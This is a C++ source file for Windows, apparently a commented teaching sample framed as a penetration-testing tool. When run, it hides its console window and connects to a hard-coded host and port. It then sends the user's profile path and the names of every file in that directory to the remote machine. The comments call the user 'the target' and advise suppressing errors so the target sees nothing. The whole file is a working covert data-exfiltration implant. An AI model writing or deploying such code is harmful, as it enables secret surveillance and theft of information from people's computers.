#define _WINSOCK_DEPRECATED_NO_WARNINGS /* we use winsock utilities and we do not want the compiler to complain about older functionalities used, since the below code is sufficient for our needs. */
#pragma comment(lib, "Ws2_32.lib") /* we need the Ws2_32.lib library in order to use sockets (networking) */

/* now comes headers which provide various utilities for our program: */

#include <iostream> //standard input/output utilities
#include <winsock2.h> //networking utilities
#include <stdio.h> //standard input/output utilities

#include <stdlib.h> //standard input/output utilities
#include <dirent.h> //directory utilities
#include <string> //string utilities

char* userDirectory() /* char* before a functions' name means it will return a pointer to a string */
{
    char* pPath; // we define a variable of type **pointer to char** and name it pPath;
    pPath = getenv ("USERPROFILE"); /* we use the function getenv that is shipped with the previously included headers in order to know the user's directory location - in this case, it is kept in an environment variable of the Windows system called "userprofile" */
    if (pPath!=NULL) //check if the retrieved path is not empty
    {
        return pPath; //return the directory path and exit the function
    } else { /* if the path is empty which means that it was not possible to retrieve the path */   
        perror(""); //print the error and exit
    }
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_addr.s_addr = inet_addr("192.168.0.29");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);
    connect(server, (SOCKADDR *)&addr, sizeof(addr));

 char* pPath = userDirectory(); /* new local variable pPath is declared and user's directory is assigned to it (using the previously written function userDirectory() */
    send(server, pPath, sizeof(pPath), 0); /* the path is sent to the penetration tester on the previously set ip address and port */

    DIR *dir; //new variable named dir: pointer to type DIR
    struct dirent *ent; //new variable named ent: pointer to structure
    if ((dir = opendir (pPath)) != NULL) { /* if opening directory at retrieved path brings any results */
        while ((ent = readdir (dir)) != NULL) { /* iterate over items within the
directory, as long as there are next items: */
        send(server, ent->d_name, sizeof(ent->d_name), 0); /* send name of current item (file or directory contained within user's path) to the penetration tester */
        }
        closedir (dir); //close the directory that was read
    } else {
        perror (""); /* if there was an error opening the directory, print the error - this can be deleted from the final version if it works correctly so that the target does not see errors printed */
}
closesocket(server); //close the socket
WSACleanup(); //clean up the Winsock library components
}

